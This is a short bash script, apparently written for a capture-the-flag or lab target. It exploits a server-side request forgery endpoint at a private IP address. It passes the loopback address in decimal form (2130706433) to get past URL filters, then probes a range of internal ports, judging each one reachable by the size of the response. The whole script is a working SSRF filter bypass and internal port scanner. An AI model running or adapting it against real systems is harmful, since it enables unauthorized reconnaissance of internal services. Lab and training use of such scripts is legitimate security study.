#!/bin/bash

url="http://10.10.144.204:8000/attack?url="
param="http%3A%2F%2F2130706433%3A$"
counter=0

#for i in {1..10000}; 
for i in {3303..3310}; 
	do 
		echo "Working on Port ${i}"
		size=$(curl http://10.10.144.204:8000/attack?url=http://2130706433:${i} -w %{size_download} --silent --output /dev/null)
		sleep 3
		echo "${size}"
		if [[ size -lt 1045 ]]
		then
			echo "Target ${i} seems reachable"
			((counter++))
		fi
	done

echo ""
echo "There are ${counter} reachable ports"
